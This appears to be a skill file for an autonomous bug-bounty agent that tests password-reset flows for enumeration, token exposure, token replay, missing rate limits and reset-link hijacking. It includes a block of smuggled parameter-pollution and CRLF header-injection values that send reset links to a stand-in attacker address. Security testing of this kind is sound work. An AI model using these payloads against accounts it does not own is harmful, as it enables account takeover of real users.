---
name: hunt-forgot-password
description: "Hunt Forgot Password / Account Recovery Authentication Flaws — 5 distinct patterns: (1) username enumeration via different responses for valid vs invalid email, (2) reset token exposed directly in the API response body, (3) reset token not invalidated after use (replay), (4) reset delivered to an attacker inbox via email parameter pollution / JSON array or Unicode/punycode email collision, (5) no rate limit on the reset request endpoint. These are the standalone recovery-flow broken-auth primitives — distinct from reset-email host-header poisoning (hunt-host-header) and the full ATO chain (hunt-ato owns password-reset as an ATO path; prove the primitive here, chain it there). Detection: trace the full forgot-password flow from request to token to use; check response diffs between valid/invalid emails; test token replay after consumption. Medium to High (enumeration=Medium, token-reuse=High, account-takeover=Critical when chained to known-email)."
sources: hackerone_public, public_research
report_count: 6
---

## Autonomous Testing Priority

**Start with username enumeration — it's the fastest win and gates the rest.**

**Pattern 1 — Username enumeration (response difference for valid vs invalid email):**
1. POST to the forgot-password endpoint with a clearly invalid email (e.g. `nonexistent@fakedomain12345.com`) — record the response body, status code, and length
2. POST with an email you know exists (or try common patterns like `admin@target.example`, `test@target.example`, `user@target.example`)
3. Compare responses: different message ("Email sent" vs "Email not found"), different HTTP status, or meaningfully different body length = username enumeration confirmed
4. Proof: enumeration is confirmed when the two responses differ measurably (baseline vs probe) in message text, status code, or body length

**Pattern 2 — Reset token exposed in the API response:**
Some APIs return the reset token directly in the response body (instead of only emailing it). POST to the forgot-password endpoint and look for a token, link, or code in the JSON/HTML response. If a token appears that lets you reset the password, that's an immediate account-takeover vector.

**Pattern 3 — Reset token replay (reuse after use):**
1. Complete a full password reset cycle: request token → use it to reset password
2. Immediately try submitting the same token again to the reset-password endpoint
3. If the second submission returns 200 or "success" → token not invalidated after use

**Pattern 4 — Reset delivered to a second address (parameter pollution / array):**
Send the reset for victim account B (a test account you own) while adding your own address A, one shape at a time:
```
email=victimB@company.com&email=attackerA@evil.example          # duplicate parameter
email[]=victimB@company.com&email[]=attackerA@evil.example      # form array
{"email":["victimB@company.com","attackerA@evil.example"]}       # JSON array
{"email":"victimB@company.com","email":"attackerA@evil.example"} # duplicate JSON key
email=victimB@company.com%0a%0dcc:attackerA@evil.example         # header-style separator
```
Finding = inbox A receives a working reset link for account B. One parser picks the first value for the user lookup and another sends to every value (or the last one).

**Pattern 5 — No rate limit on reset requests:**
Submit the forgot-password endpoint 10-20 times rapidly with the same email. If all succeed without a 429, lockout, or CAPTCHA → no rate limit (enumeration + token flooding is possible).

**Content-type:** Forgot-password endpoints are often JSON-based REST APIs. Use `application/x-www-form-urlencoded` only if the endpoint is a traditional HTML form (check the login page's HTML to determine form encoding).

**Proof:** Username enumeration = measurably different response (body/status/length). Token exposure = token in response body. Token replay = second successful use of a consumed token. Second-address delivery = reset link for B arriving in A's inbox.

---

## Vulnerability Classes in This Skill

### 1. Username Enumeration via Password Reset
Different error messages for valid vs invalid accounts leaks the user list without authentication. Even timing differences (fast "no user found" vs slow "email queued") count.

High-value targets: admin accounts, employee email patterns, API keys derived from usernames.

### 2. Weak / Predictable Reset Tokens
A reset token derived from timestamp, username, or sequential IDs can be brute-forced:
- `base64(email + timestamp)` — decodable
- 4-6 digit numeric code — 10K guesses, easily feasible with no rate limit
- Sequential `token=1234`, `token=1235` — trivially enumerable

### 3. Token Leakage Outside the Mailbox
A reset token is a bearer secret: whoever holds the link can use it from any browser or IP. That is expected behaviour, not a finding. The OWASP Forgot Password Cheat Sheet does not require IP or session binding, and "the link works from another IP" reports get closed N/A. The finding is the token reaching someone other than the mailbox owner.

**Token leak via `Referer` / third-party resources.** When the token rides in the reset-page URL (`/reset?token=…`) and that page loads any cross-origin resource (analytics, ads, fonts, a CDN image), the full URL — token included — leaks to that third party in the `Referer` header. Check the reset page's outbound requests: if the token appears in any cross-origin `Referer`, it's harvestable without the victim's inbox. Same leak via a `<meta name=referrer>` misconfig or an outbound link the victim clicks from the reset page. Disclosed token-leak→ATO class: <https://hackerone.com/reports/173551>. Check the reset page's response headers too: the [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html) asks for `Referrer-Policy: no-referrer` on the reset page. A missing or weak policy (`unsafe-url`, `no-referrer-when-downgrade`) plus any cross-origin request carrying the token is the reportable pair; the header gap alone is a hardening note.

### 4. Reset Link Doesn't Expire
Common best practice: reset tokens expire within ~15–60 minutes (no hard RFC mandates the exact value; OWASP recommends a short, single-use lifetime). If a token from 24 hours ago still works → persistence risk for phishing attacks.

### 5. No Rate Limit on Reset Endpoint
An uncapped reset endpoint enables:
- Email flooding (DoS against victim's inbox)
- Token brute-force if the token space is small
- Username enumeration at scale

### 6. Reset Delivered to an Attacker-Controlled Address
Two independent causes, same outcome (0-click reset of account B):
- **Parameter pollution / array injection** — the lookup reads one value, the mailer sends to all or to another (Pattern 4 above).
- **Unicode / punycode email collision** — the database lookup normalises or case-folds the address (e.g. a MySQL collation that treats a Unicode lookalike of `a` as `a`) and finds victim B, but the mailer sends to the string the attacker typed, which is a different, attacker-owned mailbox. Voorivex showed this as a 0-click ATO through password reset and through OAuth logins that return a lookalike email ([Puny-Code, 0-Click Account Takeover](https://blog.voorivex.team/puny-code-0-click-account-takeover), June 2025). Test with a lookalike of your own test account B's address that you can receive (Unicode local-part or IDN domain): does the reset for that lookalike report "sent" and does the link reset B? Remediation reference: [OWASP Email Validation and Verification Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Email_Validation_and_Verification_Cheat_Sheet.html) (define one comparison policy, convert IDN to punycode for comparison, watch for homoglyphs).

---

## Related Skills

- **`hunt-ato`** — owns the account-takeover CHAIN (password-reset is its path #1; the Unicode-collision reset is its Path 12). This skill finds/proves the recovery-flow primitive; hand off to hunt-ato to assemble the full takeover.
- **`hunt-cache-poison`** — host-header injection during reset email generation (different vulnerability, same flow)
- **`hunt-brute-force`** — rate-limit testing pattern applies to the reset endpoint too
- **`hunt-auth-bypass`** — if the reset flow can be skipped entirely (go to `/reset-password?token=` with empty/null token)
- **`hunt-mfa-bypass`** — if MFA is required after reset, test the bypass there
